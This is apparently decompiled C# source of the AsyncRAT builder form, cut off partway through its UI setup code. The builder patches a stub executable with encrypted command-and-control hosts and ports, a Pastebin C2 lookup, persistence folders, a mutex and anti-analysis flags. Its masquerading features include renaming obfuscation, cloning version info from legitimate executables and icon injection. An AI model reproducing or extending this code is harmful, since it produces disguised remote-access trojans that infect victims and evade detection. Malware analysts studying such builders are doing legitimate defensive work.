using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server.Algorithm;
using Server.Helper;
using Server.Properties;
using Server.RenamingObfuscation;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace Server.Forms;

public class FormBuilder : Form
{
	private readonly Random random = new Random();

	private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

	private IContainer components;

	private GroupBox groupBox1;

	private Label label2;

	private GroupBox groupBox2;

	private TextBox textFilename;

	private Label label3;

	private Label label4;

	private CheckBox checkBox1;

	private ComboBox comboBoxFolder;

	private GroupBox groupBox3;

	private CheckBox chkAnti;

	private TextBox txtMutex;

	private Label label5;

	private TextBox txtPastebin;

	private CheckBox chkPastebin;

	private Label label6;

	private ToolTip toolTip1;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private TabPage tabPage3;

	private CheckBox chkBdos;

	private PictureBox pictureBox1;

	private ListBox listBoxPort;

	private TextBox textPort;

	private Button btnAddPort;

	private Button btnRemovePort;

	private Button btnRemoveIP;

	private Button btnAddIP;

	private ListBox listBoxIP;

	private TextBox textIP;

	private Label label1;

	private TabPage tabPage4;

	private GroupBox groupBox4;

	private TextBox txtFileVersion;

	private TextBox txtProductVersion;

	private TextBox txtOriginalFilename;

	private TextBox txtTrademarks;

	private TextBox txtCopyright;

	private TextBox txtCompany;

	private Label label14;

	private Label label13;

	private Label label12;

	private Label label11;

	private Label label10;

	private Label label9;

	private TextBox txtDescription;

	private Label label7;

	private TextBox txtProduct;

	private Label label8;

	private TabPage tabPage5;

	private GroupBox groupBox5;

	private Label label15;

	private TextBox txtIcon;

	private PictureBox picIcon;

	private CheckBox chkIcon;

	private CheckBox btnAssembly;

	private TabPage tabPage6;

	private Button btnBuild;

	private CheckBox chkObfu;

	private Button btnClone;

	private Button btnIcon;

	private NumericUpDown numDelay;

	private Label label16;

	private TextBox txtGroup;

	private Label label17;

	public FormBuilder()
	{
		InitializeComponent();
	}

	private void SaveSettings()
	{
		try
		{
			List<string> list = new List<string>();
			foreach (string item3 in listBoxPort.Items)
			{
				list.Add(item3);
			}
			Server.Properties.Settings.Default.Ports = string.Join(",", list);
			List<string> list2 = new List<string>();
			foreach (string item4 in listBoxIP.Items)
			{
				list2.Add(item4);
			}
			Server.Properties.Settings.Default.IP = string.Join(",", list2);
			Server.Properties.Settings.Default.Save();
		}
		catch
		{
		}
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBox1.Checked)
		{
			checkBox1.Text = "ON";
			textFilename.Enabled = true;
			comboBoxFolder.Enabled = true;
		}
		else
		{
			checkBox1.Text = "OFF";
			textFilename.Enabled = false;
			comboBoxFolder.Enabled = false;
		}
	}

	private void Builder_Load(object sender, EventArgs e)
	{
		comboBoxFolder.SelectedIndex = 0;
		if (Server.Properties.Settings.Default.IP.Length == 0)
		{
			listBoxIP.Items.Add("127.0.0.1");
		}
		if (Server.Properties.Settings.Default.Pastebin.Length == 0)
		{
			txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";
		}
		try
		{
			string[] array = Server.Properties.Settings.Default.Ports.Split(new string[1] { "," }, StringSplitOptions.None);
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					listBoxPort.Items.Add(text.Trim());
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] array = Server.Properties.Settings.Default.IP.Split(new string[1] { "," }, StringSplitOptions.None);
			foreach (string text2 in array)
			{
				if (!string.IsNullOrWhiteSpace(text2))
				{
					listBoxIP.Items.Add(text2.Trim());
				}
			}
		}
		catch
		{
		}
	}

	private void CheckBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (chkPastebin.Checked)
		{
			txtPastebin.Enabled = true;
			textIP.Enabled = false;
			textPort.Enabled = false;
			listBoxIP.Enabled = false;
			listBoxPort.Enabled = false;
			btnAddIP.Enabled = false;
			btnAddPort.Enabled = false;
			btnRemoveIP.Enabled = false;
			btnRemovePort.Enabled = false;
		}
		else
		{
			txtPastebin.Enabled = false;
			textIP.Enabled = true;
			textPort.Enabled = true;
			listBoxIP.Enabled = true;
			listBoxPort.Enabled = true;
			btnAddIP.Enabled = true;
			btnAddPort.Enabled = true;
			btnRemoveIP.Enabled = true;
			btnRemovePort.Enabled = true;
		}
	}

	private void BtnRemovePort_Click(object sender, EventArgs e)
	{
		if (listBoxPort.SelectedItems.Count == 1)
		{
			listBoxPort.Items.Remove(listBoxPort.SelectedItem);
		}
	}

	private void BtnAddPort_Click(object sender, EventArgs e)
	{
		try
		{
			Convert.ToInt32(textPort.Text.Trim());
			foreach (string item in listBoxPort.Items)
			{
				if (item.Equals(textPort.Text.Trim()))
				{
					return;
				}
			}
			listBoxPort.Items.Add(textPort.Text.Trim());
			textPort.Clear();
		}
		catch
		{
		}
	}

	private void BtnRemoveIP_Click(object sender, EventArgs e)
	{
		if (listBoxIP.SelectedItems.Count == 1)
		{
			listBoxIP.Items.Remove(listBoxIP.SelectedItem);
		}
	}

	private void BtnAddIP_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (string item in listBoxIP.Items)
			{
				textIP.Text = textIP.Text.Replace(" ", "");
				if (item.Equals(textIP.Text))
				{
					return;
				}
			}
			listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
			textIP.Clear();
		}
		catch
		{
		}
	}

	private async void BtnBuild_Click(object sender, EventArgs e)
	{
		if ((!chkPastebin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0)
		{
			return;
		}
		if (checkBox1.Checked)
		{
			if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text))
			{
				return;
			}
			if (!textFilename.Text.EndsWith("exe"))
			{
				textFilename.Text += ".exe";
			}
		}
		if (string.IsNullOrWhiteSpace(txtMutex.Text))
		{
			txtMutex.Text = getRandomCharacters();
		}
		if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text))
		{
			return;
		}
		ModuleDefMD asmDef = null;
		try
		{
			ModuleDefMD val = (asmDef = ModuleDefMD.Load("Stub/Stub.exe", (ModuleCreationOptions)null));
			try
			{
				using SaveFileDialog saveFileDialog1 = new SaveFileDialog();
				saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
				saveFileDialog1.InitialDirectory = Application.StartupPath;
				saveFileDialog1.OverwritePrompt = false;
				saveFileDialog1.FileName = "AsyncClient";
				if (saveFileDialog1.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				btnBuild.Enabled = false;
				WriteSettings(asmDef, saveFileDialog1.FileName);
				if (chkObfu.Checked)
				{
					await Task.Run(delegate
					{
						Renaming.DoRenaming(asmDef);
					});
				}
				((ModuleDef)asmDef).Write(saveFileDialog1.FileName);
				((ModuleDef)asmDef).Dispose();
				if (btnAssembly.Checked)
				{
					WriteAssembly(saveFileDialog1.FileName);
				}
				if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
				{
					IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
				}
				MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				SaveSettings();
				Close();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ModuleDefMD obj = asmDef;
			if (obj != null)
			{
				((ModuleDef)obj).Dispose();
			}
			btnBuild.Enabled = true;
		}
	}

	private void WriteAssembly(string filename)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			VersionResource val = new VersionResource();
			((Resource)val).LoadFrom(filename);
			val.FileVersion = txtFileVersion.Text;
			val.ProductVersion = txtProductVersion.Text;
			((Resource)val).Language = 0;
			StringFileInfo val2 = (StringFileInfo)val["StringFileInfo"];
			val2["ProductName"] = txtProduct.Text;
			val2["FileDescription"] = txtDescription.Text;
			val2["CompanyName"] = txtCompany.Text;
			val2["LegalCopyright"] = txtCopyright.Text;
			val2["LegalTrademarks"] = txtTrademarks.Text;
			val2["Assembly Version"] = val.ProductVersion;
			val2["InternalName"] = txtOriginalFilename.Text;
			val2["OriginalFilename"] = txtOriginalFilename.Text;
			val2["ProductVersion"] = val.ProductVersion;
			val2["FileVersion"] = val.FileVersion;
			((Resource)val).SaveTo(filename);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
	{
		if (btnAssembly.Checked)
		{
			btnClone.Enabled = true;
			txtProduct.Enabled = true;
			txtDescription.Enabled = true;
			txtCompany.Enabled = true;
			txtCopyright.Enabled = true;
			txtTrademarks.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtProductVersion.Enabled = true;
			txtFileVersion.Enabled = true;
		}
		else
		{
			btnClone.Enabled = false;
			txtProduct.Enabled = false;
			txtDescription.Enabled = false;
			txtCompany.Enabled = false;
			txtCopyright.Enabled = false;
			txtTrademarks.Enabled = false;
			txtOriginalFilename.Enabled = false;
			txtOriginalFilename.Enabled = false;
			txtProductVersion.Enabled = false;
			txtFileVersion.Enabled = false;
		}
	}

	private void ChkIcon_CheckedChanged(object sender, EventArgs e)
	{
		if (chkIcon.Checked)
		{
			txtIcon.Enabled = true;
			btnIcon.Enabled = true;
		}
		else
		{
			txtIcon.Enabled = false;
			btnIcon.Enabled = false;
		}
	}

	private void BtnIcon_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose Icon";
		openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
			{
				string imageLocation = GetIcon(openFileDialog.FileName);
				txtIcon.Text = imageLocation;
				picIcon.ImageLocation = imageLocation;
			}
			else
			{
				txtIcon.Text = openFileDialog.FileName;
				picIcon.ImageLocation = openFileDialog.FileName;
			}
		}
	}

	private string GetIcon(string path)
	{
		try
		{
			string text = Path.GetTempFileName() + ".ico";
			using (FileStream fileStream = new FileStream(text, FileMode.Create))
			{
				IconExtractor.Extract1stIconTo(path, (Stream)fileStream);
			}
			return text;
		}
		catch
		{
		}
		return "";
	}

	private void WriteSettings(ModuleDefMD asmDef, string AsmName)
	{
		try
		{
			string randomString = Methods.GetRandomString(32);
			Aes256 aes = new Aes256(randomString);
			X509Certificate2 x509Certificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
			X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
			byte[] inArray;
			using (RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
			{
				byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
				inArray = rSACryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
			}
			foreach (TypeDef type in ((ModuleDef)asmDef).Types)
			{
				((ModuleDef)asmDef).Assembly.Name = UTF8String.op_Implicit(Path.GetFileNameWithoutExtension(AsmName));
				((ModuleDef)asmDef).Name = UTF8String.op_Implicit(Path.GetFileName(AsmName));
				if (!(type.Name == "Settings"))
				{
					continue;
				}
				foreach (MethodDef method in type.Methods)
				{
					if (method.Body == null)
					{
						continue;
					}
					for (int i = 0; i < method.Body.Instructions.Count(); i++)
					{
						if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
						{
							if (chkPastebin.Enabled && chkPastebin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list = new List<string>();
								foreach (string item3 in listBoxPort.Items)
								{
									list.Add(item3);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
						{
							if (chkPastebin.Enabled && chkPastebin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list2 = new List<string>();
								foreach (string item4 in listBoxIP.Items)
								{
									list2.Add(item4);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
						{
							method.Body.Instructions[i].Operand = comboBoxFolder.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%File%")
						{
							method.Body.Instructions[i].Operand = textFilename.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ", ""));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
						{
							method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%BDOS%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkBdos.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Pastebin%")
						{
							if (chkPastebin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
							}
							else
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
						{
							method.Body.Instructions[i].Operand = numDelay.Value.ToString();
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			throw new ArgumentException("WriteSettings: " + ex.Message);
		}
	}

	public string getRandomCharacters()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= new Random().Next(10, 20); i++)
		{
			int index = random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
			stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
		}
		return stringBuilder.ToString();
	}

	private void BtnClone_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
			txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
			txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
			txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
			txtProduct.Text = versionInfo.ProductName ?? string.Empty;
			txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
			txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
			_ = versionInfo.FileMajorPart;
			txtFileVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
			txtProductVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormBuilder));
		this.groupBox1 = new System.Windows.Forms.GroupBox();
		this.btnRemoveIP = new System.Windows.Forms.Button();
		this.btnAddIP = new System.Windows.Forms.Button();
		this.listBoxIP = new System.Windows.Forms.ListBox();
		this.textIP = new System.Windows.Forms.TextBox();
		this.label1 = new System.Windows.Forms.Label();
		this.btnRemovePort = new System.Windows.Forms.Button();
		this.btnAddPort = new System.Windows.Forms.Button();
		this.listBoxPort = new System.Windows.Forms.ListBox();
		this.chkPastebin = new System.Windows.Forms.CheckBox();
		this.txtPastebin = new System.Windows.Forms.TextBox();
		this.label6 = new System.Windows.Forms.Label();
		this.textPort = new System.Windows.Forms.TextBox();
		this.label2 = new System.Windows.Forms.Label();
		this.groupBox2 = new System.Windows.Forms.GroupBox();
		this.comboBoxFolder = new System.Windows.Forms.ComboBox();
		this.checkBox1 = new System.Windows.Forms.CheckBox();
		this.textFilename = new System.Windows.Forms.TextBox();
		this.label3 = new System.Windows.Forms.Label();
		this.label4 = new System.Windows.Forms.Label();
		this.groupBox3 = new System.Windows.Forms.GroupBox();
		this.txtGroup = new System.Windows.Forms.TextBox();
		this.label17 = new System.Windows.Forms.Label();
		this.numDelay = new System.Windows.Forms.NumericUpDown();
		this.label16 = new System.Windows.Forms.Label();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.chkBdos = new System.Windows.Forms.CheckBox();
		this.txtMutex = new System.Windows.Forms.TextBox();
		this.label5 = new System.Windows.Forms.Label();
		this.chkAnti = new System.Windows.Forms.CheckBox();
		this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
		this.tabControl1 = new System.Windows.Forms.TabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.tabPage2 = new System.Windows.Forms.TabPage();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.tabPage4 = new System.Windows.Forms.TabPage();
		this.groupBox4 = new System.Windows.Forms.GroupBox();
		this.btnClone = new System.Windows.Forms.Button();
		this.btnAssembly = new System.Windows.Forms.CheckBox();
		this.txtFileVersion = new System.Windows.Forms.TextBox();
		this.txtProductVersion = new System.Windows.Forms.TextBox();
		this.txtOriginalFilename = new System.Windows.Forms.TextBox();
		this.txtTrademarks = new System.Windows.Forms.TextBox();
		this.txtCopyright = new System.Windows.Forms.TextBox();
		this.txtCompany = new System.Windows.Forms.TextBox();
		this.label14 = new System.Windows.Forms.Label();
		this.label13 = new System.Windows.Forms.Label();
		this.label12 = new System.Windows.Forms.Label();
		this.label11 = new System.Windows.Forms.Label();
		this.label10 = new System.Windows.Forms.Label();
		this.label9 = new System.Windows.Forms.Label();
		this.txtDescription = new System.Windows.Forms.TextBox();
		this.label7 = new System.Windows.Forms.Label();
		this.txtProduct = new System.Windows.Forms.TextBox();
		this.label8 = new System.Windows.Forms.Label();
		this.tabPage5 = new System.Windows.Forms.TabPage();
		this.groupBox5 = new System.Windows.Forms.GroupBox();
		this.chkIcon = new System.Windows.Forms.CheckBox();
		this.label15 = new System.Windows.Forms.Label();
		this.txtIcon = new System.Windows.Forms.TextBox();
		this.btnIcon = new System.Windows.Forms.Button();
		this.picIcon = new System.Windows.Forms.PictureBox();
		this.tabPage6 = new System.Windows.Forms.TabPage();
		this.chkObfu = new System.Windows.Forms.CheckBox();
		this.btnBuild = new System.Windows.Forms.Button();
		this.groupBox1.SuspendLayout();
		this.groupBox2.SuspendLayout();
		this.groupBox3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numDelay).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.tabControl1.SuspendLayout();
		this.tabPage1.SuspendLayout();
		this.tabPage2.SuspendLayout();
		this.tabPage3.SuspendLayout();
		this.tabPage4.SuspendLayout();
		this.groupBox4.SuspendLayout();
		this.tabPage5.SuspendLayout();
		this.groupBox5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.picIcon).BeginInit();
		this.tabPage6.SuspendLayout();
		base.SuspendLayout();
		this.groupBox1.Controls.Add(this.btnRemoveIP);
		this.groupBox1.Controls.Add(this.btnAddIP);
		this.groupBox1.Controls.Add(this.listBoxIP);
		this.groupBox1.Controls.Add(this.textIP);
		this.groupBox1.Controls.Add(this.label1);
		this.groupBox1.Controls.Add(this.btnRemovePort);
		this.groupBox1.Controls.Add(this.btnAddPort);
		this.groupBox1.Controls.Add(this.listBoxPort);
		this.groupBox1.Controls.Add(this.chkPastebin);
		this.groupBox1.Controls.Add(this.txtPastebin);
		this.groupBox1.Controls.Add(this.label6);
		this.groupBox1.Controls.Add(this.textPort);
		this.groupBox1.Controls.Add(this.label2);
		this.groupBox1.Location = new System.Drawing.Point(6, 19);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Size = new System.Drawing.Size(587, 437);
		this.groupBox1.TabIndex = 1;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Connection";
		this.btnRemoveIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnRemoveIP.Location = new System.Drawing.Point(190, 156);
		this.btnRemoveIP.Name = "btnRemoveIP";
		this.btnRemoveIP.Size = new System.Drawing.Size(43, 26);
		this.btnRemoveIP.TabIndex = 18;
		this.btnRemoveIP.Text = "-";
		this.btnRemoveIP.UseVisualStyleBackColor = true;
		this.btnRemoveIP.Click += new System.EventHandler(BtnRemoveIP_Click);
		this.btnAddIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnAddIP.Location = new System.Drawing.Point(72, 156);
		this.btnAddIP.Name = "btnAddIP";
		this.btnAddIP.Size = new System.Drawing.Size(43, 26);
		this.btnAddIP.TabIndex = 17;
		this.btnAddIP.Text = "+";
		this.btnAddIP.UseVisualStyleBackColor = true;
		this.btnAddIP.Click += new System.EventHandler(BtnAddIP_Click);
		this.listBoxIP.FormattingEnabled = true;
		this.listBoxIP.ItemHeight = 20;
		this.listBoxIP.Location = new System.Drawing.Point(72, 66);
		this.listBoxIP.Name = "listBoxIP";
		this.listBoxIP.Size = new System.Drawing.Size(161, 84);
		this.listBoxIP.TabIndex = 16;
		this.textIP.Location = new System.Drawing.Point(72, 34);
		this.textIP.Name = "textIP";
		this.textIP.Size = new System.Drawing.Size(161, 26);
		this.textIP.TabIndex = 15;
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(18, 37);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(43, 20);
		this.label1.TabIndex = 14;
		this.label1.Text = "DNS";
		this.btnRemovePort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnRemovePort.Location = new System.Drawing.Point(480, 156);
		this.btnRemovePort.Name = "btnRemovePort";
		this.btnRemovePort.Size = new System.Drawing.Size(43, 26);
		this.btnRemovePort.TabIndex = 13;
		this.btnRemovePort.Text = "-";
		this.btnRemovePort.UseVisualStyleBackColor = true;
		this.btnRemovePort.Click += new System.EventHandler(BtnRemovePort_Click);
		this.btnAddPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnAddPort.Location = new System.Drawing.Point(362, 156);
		this.btnAddPort.Name = "btnAddPort";
		this.btnAddPort.Size = new System.Drawing.Size(43, 26);
		this.btnAddPort.TabIndex = 12;
		this.btnAddPort.Text = "+";
		this.btnAddPort.UseVisualStyleBackColor = true;
		this.btnAddPort.Click += new System.EventHandler(BtnAddPort_Click);
		this.listBoxPort.FormattingEnabled = true;
		this.listBoxPort.ItemHeight = 20;
		this.listBoxPort.Location = new System.Drawing.Point(362, 66);
		this.listBoxPort.Name = "listBoxPort";
		this.listBoxPort.Size = new System.Drawing.Size(161, 84);
		this.listBoxPort.TabIndex = 10;
		this.chkPastebin.AutoSize = true;
		this.chkPastebin.Location = new System.Drawing.Point(22, 307);
		this.chkPastebin.Name = "chkPastebin";
		this.chkPastebin.Size = new System.Drawing.Size(130, 24);
		this.chkPastebin.TabIndex = 9;
		this.chkPastebin.Text = "Use Pastebin";
		this.toolTip1.SetToolTip(this.chkPastebin, "IP:PORT .. Example 127.0.0.1:6606");
		this.chkPastebin.UseVisualStyleBackColor = true;
		this.chkPastebin.CheckedChanged += new System.EventHandler(CheckBox2_CheckedChanged);
		this.txtPastebin.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Pastebin", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtPastebin.Enabled = false;
		this.txtPastebin.Location = new System.Drawing.Point(106, 352);
		this.txtPastebin.Name = "txtPastebin";
		this.txtPastebin.Size = new System.Drawing.Size(271, 26);
		this.txtPastebin.TabIndex = 8;
		this.txtPastebin.Text = Server.Properties.Settings.Default.Pastebin;
		this.toolTip1.SetToolTip(this.txtPastebin, "IP:PORT .. Example 127.0.0.1:6606");
		this.label6.AutoSize = true;
		this.label6.Location = new System.Drawing.Point(14, 355);
		this.label6.Name = "label6";
		this.label6.Size = new System.Drawing.Size(71, 20);
		this.label6.TabIndex = 7;
		this.label6.Text = "Pastebin";
		this.textPort.Location = new System.Drawing.Point(362, 34);
		this.textPort.Name = "textPort";
		this.textPort.Size = new System.Drawing.Size(161, 26);
		this.textPort.TabIndex = 6;
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(308, 37);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(38, 20);
		this.label2.TabIndex = 3;
		this.label2.Text = "Port";
		this.groupBox2.Controls.Add(this.comboBoxFolder);
		this.groupBox2.Controls.Add(this.checkBox1);
		this.groupBox2.Controls.Add(this.textFilename);
		this.groupBox2.Controls.Add(this.label3);
		this.groupBox2.Controls.Add(this.label4);
		this.groupBox2.Location = new System.Drawing.Point(6, 17);
		this.groupBox2.Name = "groupBox2";
		this.groupBox2.Size = new System.Drawing.Size(585, 439);
		this.groupBox2.TabIndex = 7;
		this.groupBox2.TabStop = false;
		this.groupBox2.Text = "Install";
		this.comboBoxFolder.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxFolder.Enabled = false;
		this.comboBoxFolder.FormattingEnabled = true;
		this.comboBoxFolder.Items.AddRange(new object[2] { "%AppData%", "%Temp%" });
		this.comboBoxFolder.Location = new System.Drawing.Point(103, 149);
		this.comboBoxFolder.Name = "comboBoxFolder";
		this.comboBoxFolder.Size = new System.Drawing.Size(271, 28);
		this.comboBoxFolder.TabIndex = 8;
		this.checkBox1.AutoSize = true;
		this.checkBox1.Location = new System.Drawing.Point(15, 29);
		this.checkBox1.Name = "checkBox1";
		this.checkBox1.Size = new System.Drawing.Size(67, 24);
		this.checkBox1.TabIndex = 7;
		this.checkBox1.Text = "OFF";
		this.checkBox1.UseVisualStyleBackColor = true;
		this.checkBox1.CheckedChanged += new System.EventHandler(checkBox1_CheckedChanged);
		this.textFilename.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Filename", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.textFilename.Enabled = false;
		this.textFilename.Location = new System.Drawing.Point(103, 92);
		this.textFilename.Name = "textFilename";
		this.textFilename.Size = new System.Drawing.Size(271, 26);
		this.textFilename.TabIndex = 5;
		this.textFilename.Text = Server.Properties.Settings.Default.Filename;
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(11, 152);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(54, 20);
		this.label3.TabIndex = 3;
		this.label3.Text = "Folder";
		this.label4.AutoSize = true;
		this.label4.Location = new System.Drawing.Point(11, 95);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(74, 20);
		this.label4.TabIndex = 4;
		this.label4.Text = "Filename";
		this.groupBox3.Controls.Add(this.txtGroup);
		this.groupBox3.Controls.Add(this.label17);
		this.groupBox3.Controls.Add(this.numDelay);
		this.groupBox3.Controls.Add(this.label16);
		this.groupBox3.Controls.Add(this.pictureBox1);
		this.groupBox3.Controls.Add(this.chkBdos);
		this.groupBox3.Controls.Add(this.txtMutex);
		this.groupBox3.Controls.Add(this.label5);
		this.groupBox3.Controls.Add(this.chkAnti);
